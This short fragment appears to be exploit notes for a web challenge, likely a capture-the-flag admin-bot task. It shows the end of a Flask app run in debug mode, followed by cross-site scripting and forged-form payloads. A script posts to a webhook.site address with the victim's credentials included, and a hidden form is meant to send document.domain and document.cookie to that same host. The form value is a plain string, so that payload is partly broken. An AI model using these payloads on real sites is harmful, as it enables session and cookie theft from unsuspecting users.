...
if __name__ == '__main__':
    app.run(debug=True)
<script>
fetch("	https://webhook.site/ade5a4ea-dacb-4eb3-84fc-23191d9df779", { 
  method: "POST",
  body: "Admin visited",
  credentials: "include"
});
...
<form action="	https://webhook.site/ade5a4ea-dacb-4eb3-84fc-23191d9df779" method="POST">
  <input type="hidden" name="cookies" value="document.domain + ' ' + document.cookie">
</form>
